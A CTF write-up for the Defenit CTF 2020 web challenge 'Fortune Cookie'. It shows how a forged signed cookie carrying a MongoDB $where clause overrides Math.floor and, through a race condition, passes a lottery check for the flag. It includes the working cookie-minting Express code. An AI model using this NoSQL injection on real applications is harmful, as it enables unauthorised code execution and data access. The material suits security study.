# Fortune Cookie  
*Defenit CTF 2020 - Web 507  
  
*Writeup by Payload as ToEatSushi*

## Problem

Here's a test of luck!  
What's your fortune today?

## Look up

```javascript  
app.get('/flag', (req, res) => {

   let { favoriteNumber } = req.query;  
   favoriteNumber = ~~favoriteNumber;

   if (!favoriteNumber) {  
       res.send('Please Input your favorite number ?삃');  
   } else {

       const client = new MongoClient(MONGO_URL, { useNewUrlParser: true });

       client.connect(function (err) {

           if (err) throw err;

           const db = client.db('fortuneCookie');  
           const collection = db.collection('posts');

           collection.findOne({ $where: `Math.floor(Math.random() * 0xdeaaaadbeef) === ${favoriteNumber}` })  
               .then(result => {  
                   if (favoriteNumber > 0x1337 && result) res.end(FLAG);  
                   else res.end('Number not matches. Next chance, please!')  
               });

           client.close();

       });  
   }  
})  
```

To get flag, we have to pass lottery based on Math.floor. If I have a huge
luck, I could pass at once, but I'm not.

Since we know the secret value for signing cookie, we can make every structure
in `req.signedCookies`.

```javascript  
app.get('/posts', (req, res) => {

   let client = new MongoClient(MONGO_URL, { useNewUrlParser: true });  
   let author = req.signedCookies.user;

   if (typeof author === 'string') {  
       author = { author };  
   }

   client.connect(function (err) {

       if (err) throw err;

       const db = client.db('fortuneCookie');  
       const collection = db.collection('posts');

       collection  
           .find(author)  
           .toArray()  
           .then((posts) => {  
               res.render('posts', { posts })  
           }  
           );

       client.close();

   });

});  
```

One more intersting point is `req.signedCookies.user` is given as object in
`collection.find()`. When we give `$where` key for `user`, then javascript
code will be evaluated.

## Race!

After `/posts` has a vulnerability, further steps are easy. Build a javascript
code that overrided `Math.floor`, and make a race condition. It's all

## Exploitation

1. Make cookie that includes a javascript code overwrites `Math.floor` in `$where`  
2. Pray for race condition

## Payload

To make cookie,  
```javascript  
const express = require("express");  
const cookieParser = require("cookie-parser");

const app = express();

app.use(cookieParser('?' + '?'));  
app.use(express.urlencoded());

app.get('/test', (req, res) => {  
       res.cookie('user', {author: 'maratang', $where: 'Math.floor = function(x) { return 5000; }; return 1 == 2;'}, {signed: true});  
       res.send('');  
});  
```

**`Defenit{c0n9r47ula7i0n5_0n_y0u2_9o0d_f02tun3_haHa}`**  

Original writeup (https://github.com/mdsnins/ctf-
writeups/blob/master/2020/Defenit%20CTF/Fortune%20Cookie/fortune_cookie.md).